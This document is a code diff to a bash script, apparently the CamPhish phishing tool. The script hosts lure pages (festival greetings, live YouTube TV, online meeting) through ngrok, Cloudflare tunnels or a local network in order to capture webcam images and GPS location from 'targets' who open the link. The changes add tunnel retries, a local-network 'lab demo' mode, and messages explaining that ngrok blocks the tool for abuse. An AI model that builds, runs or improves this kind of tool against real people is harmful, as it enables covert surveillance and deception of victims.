@@ -170,10 +170,59 @@ if [[ -n "$link" ]]; then
 printf "%s" "$link"
 return 0
 fi
+if [[ -f ".ngrok.log" ]] && grep -qE "ERR_NGROK_8014|Acceptable Use policy|authentication failed" ".ngrok.log"; then
+return 1
+fi
 sleep 2
 attempt=$((attempt + 1))
 done
 return 1
+}
+
+show_ngrok_failure() {
+if [[ -f ".ngrok.log" ]] && grep -q "ERR_NGROK_8014" ".ngrok.log"; then
+printf "\e[1;31m[!] Ngrok blocked this account (ERR_NGROK_8014 — Acceptable Use Policy).\e[0m\n"
+printf "\e[1;93m[\e[0m!\e[1;93m] This is NOT a university WiFi issue. Ngrok rejected the connection on their servers.\e[0m\n"
+printf "\e[1;93m[\e[0m!\e[1;93m] Phishing/security lab tools often trigger ngrok abuse detection.\e[0m\n"
+printf "\e[1;93m[\e[0m!\e[1;93m] For your lab demo use option 03 (Local Network) instead.\e[0m\n"
+printf "\e[1;77m    https://ngrok.com/docs/errors/err_ngrok_8014\e[0m\n"
+return 0
+fi
+if [[ -f ".ngrok.log" ]] && grep -q "authentication failed" ".ngrok.log"; then
+printf "\e[1;31m[!] Ngrok authentication failed — check your authtoken.\e[0m\n"
+return 0
+fi
+return 1
+}
+
+get_local_ip() {
+local ip=""
+ip=$(hostname -I 2>/dev/null | awk '{print $1}')
+if [[ -z "$ip" ]]; then
+ip=$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1); exit}')
+fi
+printf "%s" "$ip"
+}
+
+payload_site() {
+link="$1"
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+elif [[ $option_tem -eq 3 ]]; then
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+elif [[ $option_tem -eq 4 ]]; then
+sed 's+forwarding_link+'$link'+g' UWS.html > index3.html
+sed 's+uws_site_url+'$uws_site_url'+g' index3.html > index2.html
+else
+printf "\e[1;93m [!] Invalid template option!\e[0m\n"
+exit 1
+fi
+rm -rf index3.html
 }
 
 check_cloudflared_config_conflict() {
@@ -196,6 +245,91 @@ if [[ -n "$cloudflared_config_backup" && -f "$cloudflared_config_backup" ]]; the
 mv "$cloudflared_config_backup" "${cloudflared_config_backup%.camphish.bak}"
 cloudflared_config_backup=""
 fi
+}
+
+cloudflared_bin() {
+if [[ "$windows_mode" == true ]]; then
+printf "./cloudflared.exe"
+else
+printf "./cloudflared"
+fi
+}
+
+cloudflared_is_running() {
+local pid=""
+if [[ -f ".cloudflared.pid" ]]; then
+pid=$(cat .cloudflared.pid 2>/dev/null)
+if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
+return 0
+fi
+fi
+if pgrep -f "cloudflared tunnel.*127.0.0.1:3333" > /dev/null 2>&1; then
+return 0
+fi
+return 1
+}
+
+stop_cloudflared_only() {
+if [[ -f ".cloudflared.pid" ]]; then
+kill "$(cat .cloudflared.pid)" 2>/dev/null
+rm -f .cloudflared.pid
+fi
+pkill -f "cloudflared tunnel.*127.0.0.1:3333" > /dev/null 2>&1
+killall -2 cloudflared > /dev/null 2>&1
+sleep 1
+}
+
+verify_php_server() {
+if command -v curl > /dev/null 2>&1; then
+curl -s -o /dev/null -m 3 http://127.0.0.1:3333/ 2>/dev/null
+return $?
+fi
+if command -v nc > /dev/null 2>&1; then
+nc -z 127.0.0.1 3333 > /dev/null 2>&1
+return $?
+fi
+sleep 1
+return 0
+}
+
+start_cloudflared_tunnel() {
+local cf_bin link proto attempt
+cf_bin=$(cloudflared_bin)
+rm -f .cloudflared.log .cloudflared.out .cloudflared.pid
+mkdir -p .camphish-cloudflared
+
+for proto in auto http2 quic; do
+stop_cloudflared_only
+
+if [[ "$proto" == "auto" ]]; then
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\e[0m\n"
+nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url http://127.0.0.1:3333 --loglevel info > .cloudflared.out 2>&1 &
+else
+printf "\e[1;92m[\e[0m+\e[1;92m] Retrying cloudflared with --protocol %s...\e[0m\n" "$proto"
+nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url http://127.0.0.1:3333 --protocol "$proto" --loglevel info > .cloudflared.out 2>&1 &
+fi
+
+echo $! > .cloudflared.pid
+sleep 3
+
+for attempt in $(seq 1 20); do
+if ! cloudflared_is_running; then
+break
+fi
+link=$(get_cloudflare_link ".cloudflared.out")
+if [[ -n "$link" ]]; then
+sleep 2
+if cloudflared_is_running; then
+printf "%s" "$link"
+return 0
+fi
+break
+fi
+sleep 2
+done
+done
+
+return 1
 }
 
 stop() {
@@ -285,7 +419,16 @@ fi
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
+if [[ -f ".cloudflared.pid" ]]; then
+printf "\e[1;93m[\e[0m!\e[1;93m] Keep this terminal open or the Cloudflare tunnel will stop (Error 1033).\e[0m\n"
+fi
 while [ true ]; do
+
+if [[ -f ".cloudflared.pid" ]] && ! cloudflared_is_running; then
+printf "\n\e[1;31m[!] cloudflared stopped running! Tunnel is down (Error 1033).\e[0m\n"
+printf "\e[1;93m[\e[0m!\e[1;93m] Restart with: bash camphish.sh\e[0m\n"
+rm -f .cloudflared.pid
+fi
 
 if [[ -e "ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
@@ -416,64 +559,70 @@ check_cloudflared_config_conflict
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
-rm -f .cloudflared.log .cloudflared.out
 
-if [[ "$windows_mode" == true ]]; then
-    ./cloudflared.exe tunnel --no-autoupdate --url http://127.0.0.1:3333 --loglevel info --logfile .cloudflared.log > .cloudflared.out 2>&1 &
-else
-    ./cloudflared tunnel --no-autoupdate --url http://127.0.0.1:3333 --loglevel info --logfile .cloudflared.log > .cloudflared.out 2>&1 &
+if ! verify_php_server; then
+printf "\e[1;31m[!] PHP server failed to start on 127.0.0.1:3333\e[0m\n"
+restore_cloudflared_config
+exit 1
 fi
 
-link=$(wait_for_cloudflare_link ".cloudflared.log")
-if [[ -z "$link" ]]; then
-link=$(wait_for_cloudflare_link ".cloudflared.out")
-fi
+link=$(start_cloudflared_tunnel)
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run: killall cloudflared\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection (port 7844 must be open)\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url http://127.0.0.1:3333\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try: cloudflared.exe tunnel --url http://127.0.0.1:3333\n"
-if [[ -f ".cloudflared.log" ]]; then
-printf "\e[1;93m[\e[0m!\e[1;93m] cloudflared log (last 10 lines):\e[0m\n"
-tail -n 10 .cloudflared.log
-fi
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m cloudflared process crashed after starting\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m University/lab firewall may block port 7844 (TCP+UDP)\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try Ngrok instead (option 1) — often works better on campus networks\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Manual test: ./cloudflared tunnel --url http://127.0.0.1:3333\e[0m\n"
 if [[ -f ".cloudflared.out" ]]; then
-printf "\e[1;93m[\e[0m!\e[1;93m] cloudflared output (last 10 lines):\e[0m\n"
-tail -n 10 .cloudflared.out
+printf "\e[1;93m[\e[0m!\e[1;93m] cloudflared output (last 15 lines):\e[0m\n"
+tail -n 15 .cloudflared.out
 fi
 restore_cloudflared_config
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+printf "\e[1;93m[\e[0m!\e[1;93m] Keep this terminal open — closing it stops the tunnel (Error 1033).\e[0m\n"
 fi
 payload_cloudflare "$link"
-restore_cloudflared_config
 checkfound
 }
 
 payload_cloudflare() {
 link="$1"
-sed 's+forwarding_link+'$link'+g' template.php > index.php
-if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-elif [[ $option_tem -eq 3 ]]; then
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
-elif [[ $option_tem -eq 4 ]]; then
-sed 's+forwarding_link+'$link'+g' UWS.html > index3.html
-sed 's+uws_site_url+'$uws_site_url'+g' index3.html > index2.html
-else
-printf "\e[1;93m [!] Invalid template option!\e[0m\n"
+payload_site "$link"
+}
+
+payload_ngrok() {
+link="$1"
+payload_site "$link"
+}
+
+local_network_server() {
+local local_ip link
+cleanup_stale_servers
+
+local_ip=$(get_local_ip)
+if [[ -z "$local_ip" ]]; then
+printf "\e[1;31m[!] Could not detect your local IP address.\e[0m\n"
 exit 1
 fi
-rm -rf index3.html
+
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on all interfaces (0.0.0.0:3333)...\n"
+php -S 0.0.0.0:3333 > /dev/null 2>&1 &
+sleep 2
+
+if ! verify_php_server; then
+printf "\e[1;31m[!] PHP server failed to start on port 3333\e[0m\n"
+exit 1
+fi
+
+link="http://${local_ip}:3333"
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+printf "\e[1;93m[\e[0m!\e[1;93m] Local network mode — target must be on the SAME WiFi/LAN as this machine.\e[0m\n"
+printf "\e[1;93m[\e[0m!\e[1;93m] Best option for university lab demos when ngrok/cloudflare are blocked.\e[0m\n"
+payload_site "$link"
+checkfound
 }
 
 ngrok_server() {
@@ -586,12 +735,13 @@ rm -f .ngrok.log
 
 link=$(wait_for_ngrok_link)
 if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is missing or invalid\e[0m\n"
+printf "\e[1;31m[!] Direct link is not generating.\e[0m\n"
+if ! show_ngrok_failure; then
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken may be missing or invalid\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Get a free token: https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run: killall ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try option 03 (Local Network) for lab demos\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try manually: %s http 127.0.0.1:3333 --config=%s\e[0m\n" "$ngrok_bin" "$ngrok_config"
+fi
 if [[ -f ".ngrok.log" ]]; then
 printf "\e[1;93m[\e[0m!\e[1;93m] ngrok log (last 10 lines):\e[0m\n"
 tail -n 10 .ngrok.log
@@ -604,27 +754,6 @@ payload_ngrok "$link"
 checkfound
 }
 
-payload_ngrok() {
-link="$1"
-sed 's+forwarding_link+'$link'+g' template.php > index.php
-if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-elif [[ $option_tem -eq 3 ]]; then
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
-elif [[ $option_tem -eq 4 ]]; then
-sed 's+forwarding_link+'$link'+g' UWS.html > index3.html
-sed 's+uws_site_url+'$uws_site_url'+g' index3.html > index2.html
-else
-printf "\e[1;93m [!] Invalid template option!\e[0m\n"
-exit 1
-fi
-rm -rf index3.html
-}
-
 camphish() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
@@ -633,8 +762,9 @@ fi
 printf "\n-----Choose tunnel server----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Local Network (Lab Demo)\e[0m\n"
+default_option_server="3"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 3] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 select_template
 
@@ -642,6 +772,8 @@ if [[ $option_server -eq 2 ]]; then
 cloudflare_tunnel
 elif [[ $option_server -eq 1 ]]; then
 ngrok_server
+elif [[ $option_server -eq 3 ]]; then
+local_network_server
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
@@ -651,7 +783,7 @@ fi
 }
 
 select_template() {
-if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
+if [ $option_server -gt 3 ] || [ $option_server -lt 1 ]; then
 printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
